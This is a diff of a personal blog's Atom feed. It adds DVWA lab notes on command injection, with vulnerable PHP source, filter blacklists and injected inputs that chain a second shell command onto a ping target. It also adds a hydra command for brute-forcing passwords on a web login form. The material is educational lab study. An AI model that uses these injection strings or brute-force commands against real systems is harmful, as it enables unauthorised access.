@@ -1,4 +1,78 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://songzy12.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="http://songzy12.github.io/" rel="alternate" type="text/html" /><updated>2020-07-09T21:00:31+08:00</updated><id>http://songzy12.github.io/feed.xml</id><title type="html">Zhengyang Song’s Secret Base</title><subtitle>All those little bugs I have ever met.</subtitle><author><name>Zhengyang Song</name></author><entry><title type="html">Brute Force</title><link href="http://songzy12.github.io/2020/07/03/brute-force.html" rel="alternate" type="text/html" title="Brute Force" /><published>2020-07-03T22:26:03+08:00</published><updated>2020-07-03T22:26:03+08:00</updated><id>http://songzy12.github.io/2020/07/03/brute-force</id><content type="html" xml:base="http://songzy12.github.io/2020/07/03/brute-force.html">&lt;p&gt;&lt;a href=&quot;https://github.com/ethicalhack3r/DVWA/blob/master/vulnerabilities/brute/index.php&quot;&gt;https://github.com/ethicalhack3r/DVWA/blob/master/vulnerabilities/brute/index.php&lt;/a&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="http://songzy12.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="http://songzy12.github.io/" rel="alternate" type="text/html" /><updated>2020-07-09T22:40:52+08:00</updated><id>http://songzy12.github.io/feed.xml</id><title type="html">Zhengyang Song’s Secret Base</title><subtitle>All those little bugs I have ever met.</subtitle><author><name>Zhengyang Song</name></author><entry><title type="html">Command Injection</title><link href="http://songzy12.github.io/2020/07/09/command-injection.html" rel="alternate" type="text/html" title="Command Injection" /><published>2020-07-09T21:01:48+08:00</published><updated>2020-07-09T21:01:48+08:00</updated><id>http://songzy12.github.io/2020/07/09/command-injection</id><content type="html" xml:base="http://songzy12.github.io/2020/07/09/command-injection.html">&lt;p&gt;&lt;a href=&quot;https://github.com/ethicalhack3r/DVWA/blob/master/vulnerabilities/exec/index.php&quot;&gt;https://github.com/ethicalhack3r/DVWA/blob/master/vulnerabilities/exec/index.php&lt;/a&gt;&lt;/p&gt;
+
+&lt;h2&gt;Low&lt;/h2&gt;
+
+&lt;h3&gt;Source&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code&gt;    // Get input
+    $target = $_REQUEST[ 'ip' ];
+
+    // *nix
+    $cmd = shell_exec( 'ping  -c 4 ' . $target );
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3&gt;Injection&lt;/h3&gt;
+
+&lt;p&gt;Fill in: &lt;code&gt;baidu.com &amp;amp;&amp;amp; lsb_release -a&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;ping  -c 4 baidu.com &amp;amp;&amp;amp; lsb_release -a
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2&gt;Medium&lt;/h2&gt;
+
+&lt;h3&gt;Source&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code&gt;    // Set blacklist
+    $substitutions = array(
+        '&amp;amp;&amp;amp;' =&amp;gt; '',
+        ';'  =&amp;gt; '',
+    );
+
+    // Remove any of the charactars in the array (blacklist).
+    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3&gt;Injection&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;&amp;amp;&lt;/code&gt;: the first command would run in background.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;|&lt;/code&gt;: the output of the first command would be sent to the second command.&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;||&lt;/code&gt;: the second command would run if the first command failed.&lt;/li&gt;
+&lt;/ul&gt;
+
+
+&lt;p&gt;Fill in:
+- &lt;code&gt;baidu.com &amp;amp; lsb_release -a&lt;/code&gt;
+- &lt;code&gt;baidu.com | lsb_release -a&lt;/code&gt;
+- &lt;code&gt;|| lsb_release -a&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;ping  -c 4 baidu.com &amp;amp; lsb_release -a
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2&gt;High&lt;/h2&gt;
+
+&lt;h3&gt;Source&lt;/h3&gt;
+
+&lt;pre&gt;&lt;code&gt;    // Set blacklist
+    $substitutions = array(
+        '&amp;amp;'  =&amp;gt; '',
+        ';'  =&amp;gt; '',
+        '| ' =&amp;gt; '',
+        '-'  =&amp;gt; '',
+        '$'  =&amp;gt; '',
+        '('  =&amp;gt; '',
+        ')'  =&amp;gt; '',
+        '`'  =&amp;gt; '',
+        '||' =&amp;gt; '',
+    );
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h3&gt;Injection&lt;/h3&gt;
+
+&lt;p&gt;Fill in &lt;code&gt;baidu.com |lsb_release -a&lt;/code&gt;.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;ping  -c 4 baidu.com |lsb_release -a
+&lt;/code&gt;&lt;/pre&gt;</content><author><name>Zhengyang Song</name></author><summary type="html">https://github.com/ethicalhack3r/DVWA/blob/master/vulnerabilities/exec/index.php</summary></entry><entry><title type="html">Brute Force</title><link href="http://songzy12.github.io/2020/07/03/brute-force.html" rel="alternate" type="text/html" title="Brute Force" /><published>2020-07-03T22:26:03+08:00</published><updated>2020-07-03T22:26:03+08:00</updated><id>http://songzy12.github.io/2020/07/03/brute-force</id><content type="html" xml:base="http://songzy12.github.io/2020/07/03/brute-force.html">&lt;p&gt;&lt;a href=&quot;https://github.com/ethicalhack3r/DVWA/blob/master/vulnerabilities/brute/index.php&quot;&gt;https://github.com/ethicalhack3r/DVWA/blob/master/vulnerabilities/brute/index.php&lt;/a&gt;&lt;/p&gt;
 
 &lt;h2&gt;Low&lt;/h2&gt;
 
@@ -117,9 +191,31 @@
 &lt;pre&gt;&lt;code&gt;name='user_token' value='(.*?)'
 &lt;/code&gt;&lt;/pre&gt;
 
-&lt;h4&gt;Recursive Grep&lt;/h4&gt;
+&lt;h2&gt;More&lt;/h2&gt;
 
-&lt;p&gt;&lt;a href=&quot;https://nvisium.com/blog/2014/02/14/using-burp-intruder-to-test-csrf.html&quot;&gt;https://nvisium.com/blog/2014/02/14/using-burp-intruder-to-test-csrf.html&lt;/a&gt;&lt;/p&gt;</content><author><name>Zhengyang Song</name></author><summary type="html">https://github.com/ethicalhack3r/DVWA/blob/master/vulnerabilities/brute/index.php</summary></entry><entry><title type="html">Apache</title><link href="http://songzy12.github.io/2020/07/01/apache.html" rel="alternate" type="text/html" title="Apache" /><published>2020-07-01T21:18:19+08:00</published><updated>2020-07-01T21:18:19+08:00</updated><id>http://songzy12.github.io/2020/07/01/apache</id><content type="html" xml:base="http://songzy12.github.io/2020/07/01/apache.html">&lt;p&gt;&lt;a href=&quot;https://ubuntu.com/tutorials/install-and-configure-apache&quot;&gt;https://ubuntu.com/tutorials/install-and-configure-apache&lt;/a&gt;&lt;/p&gt;
+&lt;h3&gt;OWASP&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://wiki.owasp.org/index.php/Testing_for_Brute_Force_(OWASP-AT-004)&quot;&gt;https://wiki.owasp.org/index.php/Testing_for_Brute_Force_(OWASP-AT-004)&lt;/a&gt;&lt;/p&gt;
+
+&lt;h3&gt;hydra&lt;/h3&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://www.sillychicken.co.nz/2011/05/how-to-brute-force-http-forms-in-windows/&quot;&gt;http://www.sillychicken.co.nz/2011/05/how-to-brute-force-http-forms-in-windows/&lt;/a&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;hydra -l hydra -P password.lst -s 80 -f www.sillychicken.co.nz http-post-form &quot;/administrator/index.php:usrname=^USER^&amp;amp;pass=^PASS^&amp;amp;submit=Login:Incorrect Username&quot;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;blockquote&gt;&lt;p&gt;hydra –&gt; The hydra program
+-l –&gt; (lower case “L” not to be confused with a upper case i) single username to target. Use uppercase -L to specify a username list) i have setup the “hydra” account for this demo and has already been deleted
+-P –&gt; Provide path to password lis. -p to try a single password ie “passw0rd”
+-s –&gt; Port to target default port for http is 80
+-f –&gt; Exits the program after the first match is made
+{Site Address} I.E www.sillychicken.com. Do not include &lt;a href=&quot;http://&quot;&gt;http://&lt;/a&gt;
+http-post-form –&gt; service to brute force. Hydra README has the command as http-form-post       using that will give you an error
+{Path to postback page} everything after the site address must start with “/”
+{USERNAME_NAME} –&gt; the name of the username postback variable
+^USER^ –&gt; this will be replaced with the username specified by -l or -L username list
+^PASS^ –&gt; this will be replaced with the password from the defined list
+{Failed login text} –&gt; text that will only be found in a failed login&lt;/p&gt;&lt;/blockquote&gt;</content><author><name>Zhengyang Song</name></author><summary type="html">https://github.com/ethicalhack3r/DVWA/blob/master/vulnerabilities/brute/index.php</summary></entry><entry><title type="html">Apache</title><link href="http://songzy12.github.io/2020/07/01/apache.html" rel="alternate" type="text/html" title="Apache" /><published>2020-07-01T21:18:19+08:00</published><updated>2020-07-01T21:18:19+08:00</updated><id>http://songzy12.github.io/2020/07/01/apache</id><content type="html" xml:base="http://songzy12.github.io/2020/07/01/apache.html">&lt;p&gt;&lt;a href=&quot;https://ubuntu.com/tutorials/install-and-configure-apache&quot;&gt;https://ubuntu.com/tutorials/install-and-configure-apache&lt;/a&gt;&lt;/p&gt;
 
 &lt;h2&gt;Install&lt;/h2&gt;
 
@@ -306,26 +402,4 @@ However, although optimal among methods encoding symbols separately, Huffman cod
 
 &lt;h3&gt;Decoding&lt;/h3&gt;
 
-&lt;p&gt;&lt;img src=&quot;/img/LZW-Decoding.png&quot; alt=&quot;Dict&quot; /&gt;&lt;/p&gt;</content><author><name>Zhengyang Song</name></author><summary type="html">https://en.wikipedia.org/wiki/Lempel%E2%80%93Ziv%E2%80%93Welch</summary></entry><entry><title type="html">Base64</title><link href="http://songzy12.github.io/2020/06/25/base64.html" rel="alternate" type="text/html" title="Base64" /><published>2020-06-25T13:34:52+08:00</published><updated>2020-06-25T13:34:52+08:00</updated><id>http://songzy12.github.io/2020/06/25/base64</id><content type="html" xml:base="http://songzy12.github.io/2020/06/25/base64.html">&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Base64&quot;&gt;https://en.wikipedia.org/wiki/Base64&lt;/a&gt;&lt;/p&gt;
-
-&lt;h2&gt;Char Set&lt;/h2&gt;
-
-&lt;ul&gt;
-&lt;li&gt;64 base: &lt;code&gt;a-z&lt;/code&gt;, &lt;code&gt;A-Z&lt;/code&gt;, &lt;code&gt;+&lt;/code&gt;, &lt;code&gt;/&lt;/code&gt;&lt;/li&gt;
-&lt;li&gt;padding: &lt;code&gt;=&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-
-&lt;h2&gt;Encoding&lt;/h2&gt;
-
-&lt;p&gt;Base64 encoding would turn each 3 Bytes group ($3&lt;em&gt;8=24$) to 4 Bytes ($4&lt;/em&gt;6=24$), where 6 bits = 2**6 = 64.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/img/Base64-3Bytes.png&quot; alt=&quot;3 Bytes&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/img/Base64-2Bytes.png&quot; alt=&quot;2 Bytes&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/img/Base64-1Byte.png&quot; alt=&quot;1 Byte&quot; /&gt;&lt;/p&gt;
-
-&lt;h2&gt;Example&lt;/h2&gt;
-
-&lt;p&gt;&lt;img src=&quot;/img/Base64-Example.png&quot; alt=&quot;Example&quot; /&gt;&lt;/p&gt;</content><author><name>Zhengyang Song</name></author><summary type="html">https://en.wikipedia.org/wiki/Base64</summary></entry></feed>
+&lt;p&gt;&lt;img src=&quot;/img/LZW-Decoding.png&quot; alt=&quot;Dict&quot; /&gt;&lt;/p&gt;</content><author><name>Zhengyang Song</name></author><summary type="html">https://en.wikipedia.org/wiki/Lempel%E2%80%93Ziv%E2%80%93Welch</summary></entry></feed>
